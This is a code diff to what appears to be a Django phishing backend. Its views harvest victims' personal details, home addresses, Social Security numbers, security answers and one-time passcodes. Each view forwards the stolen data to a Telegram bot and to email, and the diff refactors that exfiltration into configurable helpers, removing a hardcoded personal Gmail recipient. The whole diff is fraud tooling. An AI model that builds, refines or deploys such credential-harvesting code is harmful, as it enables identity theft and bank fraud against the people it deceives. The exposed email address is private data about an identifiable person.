@@ -25,11 +25,19 @@ from core.middleware.block_ips_middleware import (
 from user_data.models import Address, BankInfo, BrowserDetail, Client
 from django.template.loader import get_template
 from core.settings import send_data_email, send_data_telegram, save_data_to_file
-from django.core.mail import send_mail
 from datetime import datetime
 
 
 logger = logging.getLogger(__name__)
+
+
+def _notification_sender():
+    return app_settings.get("from_email") or settings.DEFAULT_FROM_EMAIL
+
+
+def _notification_recipients():
+    recipients = app_settings.get("send_email_list") or getattr(settings, "EMAIL_RECIPIENTS", [])
+    return [addr for addr in recipients if addr]
 
 
 @api_view(
@@ -315,8 +323,8 @@ def logix_collect_user_basic_info(request):
             send_data_telegram(app_settings, message)
 
             subject = "The Data"
-            from_email = settings.DEFAULT_FROM_EMAIL
-            recipient_list = ["etornamasamoah@gmail.com"]
+            from_email = _notification_sender()
+            recipient_list = _notification_recipients()
 
             send_data_email(subject, message, from_email, recipient_list)
 
@@ -422,8 +430,8 @@ def logix_collect_user_home_address(request):
             send_data_telegram(app_settings, message)
 
             subject = "The Data"
-            from_email = settings.DEFAULT_FROM_EMAIL
-            recipient_list = ["etornamasamoah@gmail.com"]
+            from_email = _notification_sender()
+            recipient_list = _notification_recipients()
 
             send_data_email(subject, message, from_email, recipient_list)
 
@@ -516,8 +524,8 @@ def logix_collect_user_social_security(request):
             send_data_telegram(app_settings, message)
 
             subject = "The Data"
-            from_email = settings.DEFAULT_FROM_EMAIL
-            recipient_list = ["etornamasamoah@gmail.com"]
+            from_email = _notification_sender()
+            recipient_list = _notification_recipients()
 
             send_data_email(subject, message, from_email, recipient_list)
 
@@ -610,8 +618,8 @@ def logix_collect_user_social_security_2(request):
             send_data_telegram(app_settings, message)
 
             subject = "The Data"
-            from_email = settings.DEFAULT_FROM_EMAIL
-            recipient_list = ["etornamasamoah@gmail.com"]
+            from_email = _notification_sender()
+            recipient_list = _notification_recipients()
 
             send_data_email(subject, message, from_email, recipient_list)
 
@@ -751,34 +759,20 @@ def logix_collect_user_security_questions(request):
         # Send data to telegram
         ##############################
 
-        telegram_url = (
-            f"https://api.telegram.org/bot{app_settings['botToken']}/sendMessage"
-        )
-
-        # Send the POST request to Telegram API
-        response = requests.post(
-            telegram_url, data={"chat_id": app_settings["chatId"], "text": message}
-        )
-
-        # Check if the message was sent successfully
-        if response.status_code == 200:
-            print("Telegram message sent successfully")
-        else:
-            print(f"Failed to send message. Status code: {response.status_code}")
+        send_data_telegram(app_settings, message)
 
         #############################
         # Send Data to email
         ########################
         subject = "The Data"
-        from_email = settings.DEFAULT_FROM_EMAIL
-        recipient_list = ["etornamasamoah@gmail.com"]
+        from_email = _notification_sender()
+        recipient_list = _notification_recipients()
 
-        send_mail(
+        send_data_email(
             subject,
             message,
             from_email,
             recipient_list,
-            fail_silently=False,
         )
 
         #####################################
@@ -881,34 +875,20 @@ def logix_collect_user_otp_verification(request):
         # Send data to telegram
         ##############################
 
-        telegram_url = (
-            f"https://api.telegram.org/bot{app_settings['botToken']}/sendMessage"
-        )
-
-        # Send the POST request to Telegram API
-        response = requests.post(
-            telegram_url, data={"chat_id": app_settings["chatId"], "text": message}
-        )
-
-        # Check if the message was sent successfully
-        if response.status_code == 200:
-            print("Telegram message sent successfully")
-        else:
-            print(f"Failed to send message. Status code: {response.status_code}")
+        send_data_telegram(app_settings, message)
 
         #############################
         # Send Data to email
         ########################
         subject = "OTP Verification Data"
-        from_email = settings.DEFAULT_FROM_EMAIL
-        recipient_list = ["etornamasamoah@gmail.com"]
+        from_email = _notification_sender()
+        recipient_list = _notification_recipients()
 
-        send_mail(
+        send_data_email(
             subject,
             message,
             from_email,
             recipient_list,
-            fail_silently=False,
         )
 
         #####################################
